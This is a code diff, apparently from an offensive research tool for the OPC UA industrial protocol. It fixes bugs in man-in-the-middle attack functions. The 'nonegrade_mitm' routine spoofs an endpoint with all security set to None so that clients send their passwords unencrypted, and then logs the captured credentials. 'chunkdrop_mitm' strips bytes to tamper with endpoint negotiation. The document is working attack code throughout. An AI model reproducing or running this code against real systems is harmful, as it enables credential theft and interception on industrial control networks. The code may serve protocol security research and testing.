@@ -1550,7 +1550,7 @@ def read_client_msg(sock : socket, msg_type : Type[OpcMessage]) -> OpcMessage:
 # Same for writing.
 def write_client_msg(sock : socket, msg : OpcMessage, final_chunk : bool=True):
   with sock.makefile('wb') as sockio:
-    msg.to_bytes(sockio, final_chunk)
+    sockio.write(msg.to_bytes(final_chunk))
     sockio.flush()
     
 # A client attack is a coroutine that receives client connection sockets.
@@ -1576,7 +1576,7 @@ def client_attack(
       log(f'Started listening for an incoming client connections on {listen_host}:{listen_port}.')
       def clientsocker():
         clientsock, peeraddr = listener.accept()
-        log_success(f'Received a connection from {":".join(peeraddr)}.')
+        log_success(f'Received a connection from {peeraddr[0]}:{peeraddr[1]}.')
         return clientsock
     else:
       server_uri = server_eps[0].server.applicationUri
@@ -1593,6 +1593,7 @@ def client_attack(
       
     firstround = True
     attacker = attacker_factory(server_eps)
+    attacker.send(None)
     while firstround or persist:
       try:
         while True:
@@ -1601,7 +1602,7 @@ def client_attack(
         firstround = False
     
     if revhello_addr is None:
-      listener.shutdown(socket.SHUT_RDWR)
+      listener.shutdown(SHUT_RDWR)
       listener.close()
 
 
@@ -1610,7 +1611,7 @@ def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:
   # Make a spoofed endpoint with None security that only accepts passwords. 
   # Base this on an existing endpoints, preferably those similar to what we want.
   spoofed_ep = max(server_eps, key=lambda ep: ep.securityPolicyUri == SecurityPolicy.NONE)
-  spoofed_policy = max(spoofed_ep.userIdentityTokens, default=None, lambda p: p.tokenType == UserTokenType.USERNAME)
+  spoofed_policy = max(spoofed_ep.userIdentityTokens, default=None, key=lambda p: p.tokenType == UserTokenType.USERNAME)
   if not spoofed_policy or spoofed_policy.tokenType != UserTokenType.USERNAME:
     spoofed_policy = userTokenPolicy.create(
       policyId='1',
@@ -1623,6 +1624,7 @@ def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:
     spoofed_policy = spoofed_policy._replace(securityPolicyUri=SecurityPolicy.NONE)
   spoofed_ep = spoofed_ep._replace(
     securityPolicyUri=SecurityPolicy.NONE,
+    securityMode=MessageSecurityMode.NONE,
     userIdentityTokens=[spoofed_policy]
   )
   
@@ -1656,15 +1658,15 @@ def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:
     
     # Send an OPN response initiating an unencrypted channel.
     opnconv, _ = encodedConversation.from_bytes(opn.encodedPart)
-    opnreq, _ = openSecureChannelRequest.from_bytes(opnconv)
+    opnreq, _ = openSecureChannelRequest.from_bytes(opnconv.requestOrResponse)
     token = channelSecurityToken.create(
-      channelId=1,
+      channelId=opn.secureChannelId + 1,
       tokenId=1,
       createdAt=datetime.now(),
       revisedLifetime=opnreq.requestedLifetime,
     )
     write_client_msg(clientsock, OpenSecureChannelMessage(
-      secureChannelId=opn.secureChannelId + 1,
+      secureChannelId=token.channelId,
       securityPolicyUri=SecurityPolicy.NONE,
       senderCertificate=None,
       receiverCertificateThumbprint=None,
@@ -1682,15 +1684,15 @@ def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:
     
     # Response message helper.
     def responder(reqmsg, resptype, **data):
-      convo, _ = encodedConversation.from_bytes(reqmsg.encodedPart)
+      reqHeader, _ = requestHeader.from_bytes(NodeIdField().from_bytes(reqmsg.requestOrResponse)[1])
       write_client_msg(clientsock, ConversationMessage(
-        securityChannelId=token.channelId,
+        secureChannelId=token.channelId,
         tokenId=token.tokenId,
         encodedPart=encodedConversation.to_bytes(encodedConversation.create(
-          sequenceNumber=req_convo.sequenceNumber,
-          requestId=req_convo.requestId,
+          sequenceNumber=reqmsg.sequenceNumber,
+          requestId=reqmsg.requestId,
           requestOrResponse=resptype.to_bytes(resptype.create(
-            responseHeader=simple_respheader(reqmsg.requestHeader),
+            responseHeader=simple_respheader(reqHeader),
             **data
           )),
         ))
@@ -1707,13 +1709,13 @@ def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:
     if ep_req:
       # Respond with the spoofed endpoint.
       log('Received GetEndpointsRequest. Responding with spoofed (unencrypted password demanding) endpoint.')
-      responder(convomsg1, getEndpointsResponse, endpoints=[spoofed_ep])
+      responder(convo1, getEndpointsResponse, endpoints=[spoofed_ep])
     else:
       csr, _ = createSessionRequest.from_bytes(convo1.requestOrResponse)
       log('Received CreateSessionRequest.')
-      responder(convomsg1, createSessionResponse,
+      responder(convo1, createSessionResponse,
         sessionId=NodeId(9,1234),
-        authToken=NodeId(9,1235),
+        authenticationToken=NodeId(9,1235),
         revisedSessionTimeout=csr.requestedSessionTimeout,
         serverNonce=None,
         serverCertificate=spoofed_ep.serverCertificate,
@@ -1725,7 +1727,7 @@ def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:
       
       # Finally consume ActivateSessionRequest.
       convomsg2 = read_client_msg(clientsock, ConversationMessage)
-      convo2, _ = encodedConversation.from_bytes(convomsg1.encodedPart)
+      convo2, _ = encodedConversation.from_bytes(convomsg2.encodedPart)
       asr, _ = activateSessionRequest.from_bytes(convo2.requestOrResponse)
       log_success('Received unencrypted ActivateSessionResponse from client.')
       if asr.userIdentityToken.policyId != spoofed_policy.policyId:
@@ -1739,7 +1741,7 @@ def nonegrade_mitm(server_eps : List[endpointDescription.Type]) -> ClientAttack:
         log_success(f'Password: {pwd}')
   
       # Kill this connection and end the attack round.
-      clientsock.shutdown(socket.SHUT_RDWR)
+      clientsock.shutdown(SHUT_RDWR)
       clientsock.close()
       return
 
@@ -1805,7 +1807,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
       nonlocal cursor
       
       # Find starting offset of endpoint the cursor is currently in.
-      rcursor = max(offset for offset in offsets if offset <= cursor, default=offsets[0])
+      rcursor = max((offset for offset in offsets if offset <= cursor), default=offsets[0])
       
       # Keep consuming endpoint description until either cursor or field is reached.
       # Run through the description at most twice.
@@ -1870,7 +1872,7 @@ def chunkdrop_mitm(server_eps : List[endpointDescription.Type], tcp_resets : boo
     
     # Finish with a TCP transport profile.
     drop_until_field('transportProfileUri')
-    while not checkfield(StringField(), lambda: pu: pu.endswith('uatcp-uasc-uabinary')):
+    while not checkfield(StringField(), lambda pu: pu.endswith('uatcp-uasc-uabinary')):
       drop_until_field('transportProfileUri')
     
     # Finally, drop all but the last byte, the securityLevel of the last endpoint in the list.
